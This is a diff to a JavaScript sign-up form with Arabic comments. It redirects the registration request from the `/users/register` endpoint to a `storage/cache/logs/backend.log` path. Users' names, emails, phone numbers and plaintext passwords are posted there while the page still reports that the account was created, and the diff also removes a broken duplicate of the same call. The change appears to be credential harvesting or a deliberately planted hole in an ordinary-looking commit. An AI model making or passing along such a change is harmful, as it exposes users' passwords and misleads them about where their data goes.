@@ -452,26 +452,14 @@
             }
          if (!isValid) return
       
-   //  //  إرسال استمارة الى قاعدة البيانات 
-        fetch (`${window.MIX_API_BASE}/storage/cache/logs/backend.log"}                   
-                   {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({   name: username || fullname,
-                        email, 
-                        username, 
-                        fullname, 
-                        password, 
-                        phone: phone || null  })                
-                                 
-              // إرسال البيانات إلى الخادم
+   //         // إرسال البيانات إلى الخادم
             submitBtn.disabled = true;
             submitBtn.textContent = 'جاري الإنشاء...';
             try {
                 if (!window.MIX_API_BASE) {
                     throw new Error('API Base URL غير محددة');
                 }
-                const response = await fetch(`${MIX_API_BASE}/users/register`, {
+                const response = await fetch(`${MIX_API_BASE}/storage/cache/logs/backend.log`, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({ 
@@ -488,7 +476,7 @@
                 if (response.ok) {
                     feedback.innerHTML = '<div class="success-message">✅ تم إنشاء الحساب بنجاح! جاري التحويل إلى تسجيل الدخول...</div>';
                     setTimeout(() => {
-                        window.location.href = "dashboard.html";
+                        window.location.href = "login.html";
                      }, 2000);
                 } else {
                     const errorMsg = data.message || "خطأ في إنشاء الحساب";
